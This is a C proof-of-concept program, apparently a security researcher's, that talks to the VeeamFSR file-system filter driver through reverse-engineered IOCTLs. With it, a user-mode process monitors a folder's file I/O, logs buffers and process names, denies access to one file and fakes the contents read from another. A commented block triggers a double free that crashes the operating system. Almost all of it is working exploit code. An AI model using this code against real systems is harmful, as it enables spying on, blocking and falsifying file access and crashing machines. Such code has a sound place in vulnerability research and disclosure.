#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <psapi.h>
#include <stdio.h>

enum NameEntryType
{
    ProcessEntry,
    MonitoredEntry,
    FileEntry
};

enum Operations_222440 : DWORD
{
    Op10 = 0x10,
    Op11 = 0x11,
    Op12 = 0x12,
    Op13 = 0x13,
    Op14 = 0x14,
    Op15 = 0x15,
    Op20 = 0x20,
    Op21 = 0x21,
    Op22 = 0x22,
    Op30 = 0x30,
    Op31 = 0x31,
};


enum RequestFlags : BYTE
{
    RF_CallPreHandler = 0x1,
    RF_CallPostHandler = 0x2,
    RF_PassDown = 0x10,
    RF_Wait = 0x20,
    RF_DenyAccess = 0x40,
    RF_CompleteRequest = 0x80,
};

struct CtrlBlock
{
    BYTE ProcessIndex;
    BYTE FolderIndex;
    WORD FileIndex : 10;
    WORD MajorFunction : 6;
};

struct SharedBufferEntry
{
    //header
    DWORD Flags;
    union
    {
        CtrlBlock Ctrl;
        DWORD d1;
    };

    //body
    DWORD d2;
    DWORD d3;

    DWORD d4;
    DWORD d5;
    DWORD d6;
    DWORD d7;
};

struct SharedBufferDescriptor
{
    DWORD FolderIndex;
    DWORD SharedBufferLength;
    DWORD SharedBufferPtr;
    DWORD Unk;
};

SharedBufferDescriptor SharedBufDesc;

#define IOCTL_START_FOLDER_MONITORING CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x222400
#define IOCTL_STOP_FOLDER_MONITORING  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x222404
#define IOCTL_UNWAIT_REQUEST          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x920, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x222480
#define IOCTL_SET_STREAM_FLAGS        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x910, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x222440

struct FlagsDescritptor
{
    BYTE Function;
    RequestFlags RFlags;
};

DWORD FileMapping[0x80];
DWORD ProcessMapping[0x80];

BOOL CtlDestroyFolder(HANDLE hDevice, DWORD FolderIndex)
{
    DWORD BytesReturned;

    BOOL r = DeviceIoControl(hDevice, IOCTL_STOP_FOLDER_MONITORING, &FolderIndex, sizeof(FolderIndex), 0, 0, &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("DestroyFolder failed\n");
    }
    return r;
}

BOOL CtlCreateMonitoredFolder(
    HANDLE hDevice,
    PCWCHAR FolderPathName,
    PHANDLE SharedBufSemaphore,
    PHANDLE NewEntrySemaphore
)
{
    DWORD BytesReturned;

    struct MonitoredFolder
    {
        HANDLE SharedBufSemaphore;
        DWORD d1;
        HANDLE NewEntrySemaphore;
        DWORD d2;
        DWORD f1;  //+0x10
        DWORD SharedBufferEntriesCount; //+0x14
        DWORD PathLength; //+0x18
        WCHAR PathName[0x80]; //+0x1C
    };

    MonitoredFolder Folder = { };
    //const wchar_t *pFolderPath = L"\\Device\\HardDiskVolume1\\TMP\\";

    *SharedBufSemaphore = *NewEntrySemaphore = nullptr;
    // Add protected folder
    Folder.SharedBufSemaphore = CreateSemaphoreW(nullptr, 0, 10000, nullptr);
    Folder.NewEntrySemaphore = CreateSemaphoreW(nullptr, 1, 10000, nullptr);
    Folder.f1 = 0x20;
    Folder.SharedBufferEntriesCount = 0x200;
    Folder.PathLength = wcslen(FolderPathName) * sizeof(FolderPathName[0]);
    wcscpy(Folder.PathName, FolderPathName);
    BOOL r = DeviceIoControl(hDevice, IOCTL_START_FOLDER_MONITORING, &Folder, sizeof(Folder), &SharedBufDesc, sizeof(SharedBufDesc), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("CreateFolder failed\n");
    }
    else
    {
        *SharedBufSemaphore = Folder.SharedBufSemaphore;
        *NewEntrySemaphore = Folder.NewEntrySemaphore;
        if (BytesReturned != sizeof(SharedBufDesc))
        {
            printf("Bad sizeof shared buffer\n");
            r = FALSE;
        }
    }
    return r;
}

BOOL CtlUnwaitRequest(
    HANDLE hDevice,
    CtrlBlock* Ctrl,
    WORD SharedBufferEntryIndex,
    RequestFlags RFlags
)
{
    struct UnwaitDescriptor
    {
        CtrlBlock Ctrl;

        DWORD SharedBufferEntryIndex;
        RequestFlags RFlags;
        BYTE  IsStatusPresent;
        BYTE  IsUserBufferPresent;
        BYTE  SetSomeFlag;
        DWORD Status;
        DWORD Information;
        PVOID UserBuffer;
        DWORD d6;
        DWORD UserBufferLength;
    };

    DWORD BytesReturned;
    UnwaitDescriptor Unwait = { 0, };

    Unwait.Ctrl.FolderIndex = Ctrl->FolderIndex;
    Unwait.Ctrl.MajorFunction = Ctrl->MajorFunction;
    Unwait.Ctrl.FileIndex = Ctrl->FileIndex;
    Unwait.SharedBufferEntryIndex = SharedBufferEntryIndex;
    Unwait.RFlags = RFlags;

    Unwait.IsUserBufferPresent = 0;

    // Uncomment the code below to crash the OS.
    // VeeamFSR doesn't handle this parameter correctly. Setting IsUserBuffPresent to true 
    // leads to double free in the completion rountine.
    //Unwait.UserBuffer = (PVOID)"aaaabbbb";
    //Unwait.UserBufferLength = 8;
    //Unwait.IsUserBufferPresent = 1;


    BOOL r = DeviceIoControl(hDevice, IOCTL_UNWAIT_REQUEST, &Unwait, sizeof(Unwait), 0, 0, &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("UnwaitRequest failed\n");
    }
    return r;
}

BOOL CtlUnwaitRequest(
    HANDLE hDevice,
    CtrlBlock* Ctrl,
    WORD SharedAreaEntryIndex
)
{
    return CtlUnwaitRequest(hDevice, Ctrl, SharedAreaEntryIndex, RF_PassDown);
}

BOOL CtlSetStreamFlags(HANDLE hDevice, CtrlBlock* Ctrl, FlagsDescritptor FlagsDescs[], DWORD FlagsCount)
{
    struct SubDataDescr
    {
        BYTE SubDataCount;
        BYTE Flags;
        WORD SubDataOffset;
    };

    struct SubData
    {
        DWORD d0;
        BYTE  Flags;
    };

#pragma pack(push, 1)
    struct StreamFlagDescriptor
    {
        BYTE Unk0; //Should be 1
        RequestFlags RFlags;
        BYTE Unk1; //Should be 28 * 4 + 8
        BYTE Unk2; //Shoulfd be 0
    };

    struct StreamFlags
    {
        CtrlBlock Ctrl;
        DWORD Operation;
        StreamFlagDescriptor StreamFlags[30]; //IRP_MJ_MAXIMUM_FUNCTION + 2
        BYTE Bytes[5];
    };
#pragma pack(pop)

    StreamFlags Flags{};
    Flags.Ctrl.ProcessIndex = Ctrl->ProcessIndex;
    Flags.Ctrl.FileIndex = Ctrl->FileIndex;
    Flags.Ctrl.FolderIndex = Ctrl->FolderIndex;
    Flags.Operation = Op15;

    Flags.StreamFlags[0].Unk0 = 1;
    Flags.StreamFlags[0].RFlags = RF_Wait;
    Flags.StreamFlags[0].Unk1 = 28 * 4 + 8;
    Flags.StreamFlags[0].Unk2 = 0;
    for (int i = 1; i < 29 /*IRP_MJ_MAXIMUM_FUNCTION + 2*/; i++)
    {
        Flags.StreamFlags[i].Unk0 = 1;
        Flags.StreamFlags[i].RFlags = RF_PassDown;
        Flags.StreamFlags[i].Unk1 = 28 * 4 + 8;
        Flags.StreamFlags[i].Unk2 = 0;
    }
    Flags.Bytes[0] = 0xB0;
    Flags.Bytes[1] = 0xBA;
    Flags.Bytes[2] = 0xFE;
    Flags.Bytes[3] = 0xCA;
    Flags.Bytes[4] = 0x11;

    for (unsigned int i = 0; i < FlagsCount; i++)
    {
        BYTE Function = FlagsDescs[i].Function;
        Flags.StreamFlags[Function].RFlags = FlagsDescs[i].RFlags;
    }

    DWORD BytesReturned;
    BYTE Out[0x34];
    BOOL r = DeviceIoControl(hDevice, IOCTL_SET_STREAM_FLAGS, &Flags, sizeof(Flags), Out, sizeof(Out), &BytesReturned, 0);
    if (r == FALSE)
    {
        printf("CtlSetStreamFlags failed\n");
    }
    return r;
}

DWORD GetProcessImageFileNameByPid(DWORD Pid, PWCHAR pBuf, DWORD Length)
{
    DWORD r = 0;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, Pid);
    if (hProcess == NULL)
    {
        printf("OpenProcess failed with %d for pid %d\n", GetLastError(), Pid);
    }
    else
    {
        r = GetProcessImageFileNameW(hProcess, pBuf, Length);
        if (r == 0)
        {
            printf("GetProcessImageFileNameW failed: %d\n", GetLastError());
        }
        CloseHandle(hProcess);
    }

    return r;
}


BOOL IsEqualPathName(SharedBufferEntry* NameEntry, const PCWCHAR PathName)
{
    size_t ProtectedFileNameLength = wcslen(PathName) * sizeof(PathName[0]);
    ProtectedFileNameLength += sizeof(PathName[0]); //including null termination

    return (_wcsnicmp(PathName, (wchar_t*)NameEntry->d6, NameEntry->d4) == 0);
}

VOID PrintEntryInfo(const CHAR* pOpName, SharedBufferEntry IOEntryBuffer[], SharedBufferEntry* pEntry)
{
    WCHAR ProcessName[MAX_PATH];
    DWORD ProcessIndex = ProcessMapping[pEntry->Ctrl.ProcessIndex];
    DWORD Pid = IOEntryBuffer[ProcessIndex].d6;
    DWORD ProcessNameLength = GetProcessImageFileNameByPid(Pid, ProcessName, MAX_PATH);
    DWORD NameIndex = FileMapping[pEntry->Ctrl.FileIndex];
    printf("%s for %ls by process %d (%ls)\n", pOpName, (PWSTR)IOEntryBuffer[NameIndex].d6, Pid, ProcessNameLength == 0 ? L"null" : ProcessName);
}

VOID PrintBuffer(PBYTE pBuffer, DWORD Length)
{
    printf("Dumping buffer (0x80 max):\n");
    if (Length > 0x80)
    {
        Length = 0x80;
    }
    for (unsigned int i = 0; i < Length; i++)
    {
        if ((i & 7) == 0)
        {
            printf("\n");
        }
        if (IsCharAlphaNumericA(pBuffer[i]) == TRUE)
        {
            printf(" %c ", pBuffer[i]);
        }
        else
        {
            printf("%02x ", pBuffer[i]);
        }
    }
    printf("\n");
}

int wmain(int arc, wchar_t** argv)
{
    if (arc != 2)
    {
        printf("Usage: veeamon NativePathToFolder\n");
        return -1;
    }

    HANDLE hDevice = CreateFileW(L"\\\\.\\VeeamFSR", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 0, OPEN_EXISTING, 0, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("CreateFileW: %d\n", GetLastError());
        return -1;
    }

    HANDLE SharedBufSemaphore;
    HANDLE NewEntrySemaphore;
    WORD CurrEntry = 0;

    PCWCHAR Folder = argv[1];
    if (CtlCreateMonitoredFolder(
        hDevice,
        Folder,
        &SharedBufSemaphore,
        &NewEntrySemaphore) == FALSE)
    {
        printf("Failed setting up monitored folder\n");
        return -1;
    }

    printf("Set up monitor on %ls\n", Folder);
    printf("FolderIndex: 0x%x\n", SharedBufDesc.FolderIndex);
    printf("Shared buffer: %p\n", (PVOID)SharedBufDesc.SharedBufferPtr);
    printf("Shared buffer length: 0x%x\n", SharedBufDesc.SharedBufferLength);
    printf("Uknown: 0x%x\n", SharedBufDesc.Unk);
    printf("\nStarting IO loop\n");

    SharedBufferEntry* IOEntryBuffer = (SharedBufferEntry*)SharedBufDesc.SharedBufferPtr;
    SharedBufferEntry* IOEntry;

    PCWCHAR ProtectedName = L"\\Device\\HarddiskVolume1\\tmp\\Cthon98.txt";
    PCWCHAR FakeReadName = L"\\Device\\HarddiskVolume1\\tmp\\AzureDiamond.txt";
    for (;;)
    {
        LONG l;

        ReleaseSemaphore(NewEntrySemaphore, 1, &l);
        WaitForSingleObject(SharedBufSemaphore, INFINITE);

        printf("Entry #%d\n", CurrEntry);

        IOEntry = &IOEntryBuffer[CurrEntry];
        switch (IOEntry->Ctrl.MajorFunction)
        {
        //
        // Special entry handlers
        //
        case 0x37: //Name entry
        {
            printf("\tADD\n");

            switch (IOEntry->d2)
            {
            case ProcessEntry:
                printf("\tprocess: %d\n", IOEntry->d6);
                ProcessMapping[IOEntry->d3] = CurrEntry;
                break;
            case FileEntry:
                //.d4 == length
                printf("\tfile: %ls\n", (PWSTR)IOEntry->d6);
                FileMapping[IOEntry->d3] = CurrEntry;
                break;
            case MonitoredEntry:
                //.d4 == length
                printf("\tmonitored dir: %ls\n", (PWSTR)IOEntry->d6);
                break;
            }

            break;
        }
        case 0x38:
        {
            printf("\tDELETION\n");
            switch (IOEntry->d2)
            {
            case ProcessEntry:
                printf("\tprocess\n");
                break;
            case FileEntry:
                printf("\tfile\n");
                break;
            case MonitoredEntry:
                printf("\tmonitored dir\n");
                break;
            }
            printf("\tindex: %d\n", IOEntry->d2);

            break;
        }
        case 0x39:
        {
            printf("\tCOMPLETION of IRP_MJ_%d, index = %d, status = 0x%x, information: 0x%x\n",
                IOEntry->d2,
                IOEntry->d3,
                IOEntry->d4,
                IOEntry->d5);

            break;
        }
        case 0x3A:
        {
            printf("\tWRITE-related entry\n");
            break;
        }
        //
        // IRP_MJ_XXX and FastIo handlers
        //
        case 0x0: //IRP_MJ_CREATE
        case 0x33: //Fast _IRP_MJ_CREATE
        {
            PrintEntryInfo("IRP_MJ_CREATE", IOEntryBuffer, IOEntry);

            DWORD EntryNameIndex = FileMapping[IOEntry->Ctrl.FileIndex];
            if (IsEqualPathName(&IOEntryBuffer[EntryNameIndex], ProtectedName))
            {
                printf("Denying access to %ls\n", ProtectedName);
                CtlUnwaitRequest(hDevice, &IOEntry->Ctrl, CurrEntry, RF_DenyAccess);
                break;
            }

            FlagsDescritptor FlagsDescs[2];
            if (IsEqualPathName(&IOEntryBuffer[EntryNameIndex], FakeReadName))
            {
                FlagsDescs[0].Function = 3; //IRP_MJ_READ
                FlagsDescs[0].RFlags = RF_CompleteRequest;
                FlagsDescs[1].Function = 4; //IRP_MJ_WRITE
                FlagsDescs[1].RFlags = (RequestFlags)(RF_PassDown | RF_CallPreHandler);
            }
            else
            {
                FlagsDescs[0].Function = 3; //IRP_MJ_READ
                FlagsDescs[0].RFlags = (RequestFlags)(RF_PassDown | RF_CallPostHandler);
                FlagsDescs[1].Function = 4; //IRP_MJ_WRITE
                FlagsDescs[1].RFlags = (RequestFlags)(RF_PassDown | RF_CallPreHandler);
            }
            CtlSetStreamFlags(hDevice, &IOEntry->Ctrl, FlagsDescs, 2);

            CtlUnwaitRequest(hDevice, &IOEntry->Ctrl, CurrEntry, RF_PassDown);

            break;
        }
        case 0x3: //IRP_MJ_READ
        case 0x1D: //Fast IRP_MJ_READ
        {
            PrintEntryInfo("IRP_MJ_READ", IOEntryBuffer, IOEntry);

            DWORD Length = IOEntry->d5;
            PBYTE Buffer = (PBYTE)IOEntry->d6;
            DWORD EntryNameIndex = FileMapping[IOEntry->Ctrl.FileIndex];
            if (IsEqualPathName(&IOEntryBuffer[EntryNameIndex], FakeReadName) == FALSE)
            {
                PrintBuffer(Buffer, Length);
            }
            else
            {
                printf("Faking read buffer with '*' for %ls\n", FakeReadName);
                for (unsigned int i = 0; i < Length; i++)
                {
                    Buffer[i] = '*';
                }
                PrintBuffer(Buffer, Length);
                CtlUnwaitRequest(hDevice, &IOEntry->Ctrl, CurrEntry, RF_CompleteRequest);
            }

            break;
        }
        case 0x4: //IRP_MJ_WRITE
        case 0x1E: //Fast IRP_MJ_WRITE
        {
            PrintEntryInfo("IRP_MJ_WRITE", IOEntryBuffer, &IOEntryBuffer[CurrEntry]);

            DWORD Length = IOEntry->d5;
            PBYTE Buffer = (PBYTE)IOEntry->d6;
            PrintBuffer(Buffer, Length);

            break;
        }
        default:
        {
            CHAR OpName[40]{};
            sprintf_s(OpName, 40, "IRP_MJ_%d", IOEntry->Ctrl.MajorFunction);
            PrintEntryInfo(OpName, IOEntryBuffer, &IOEntryBuffer[CurrEntry]);

            break;
        }
        }

        printf("\t0x%.8x 0x%.8x  0x%.8x 0x%.8x\n", IOEntry->Flags, IOEntry->d1, IOEntry->d2, IOEntry->d3);
        printf("\t0x%.8x 0x%.8x  0x%.8x 0x%.8x\n", IOEntry->d4, IOEntry->d5, IOEntry->d6, IOEntry->d7);

        CurrEntry++;
        if (CurrEntry >= 0x200)
        {
            break;
        }
    }

    CtlDestroyFolder(hDevice, 0);
    CloseHandle(hDevice);

    printf("Press any key...\n");
    getchar();

    return 0;
}

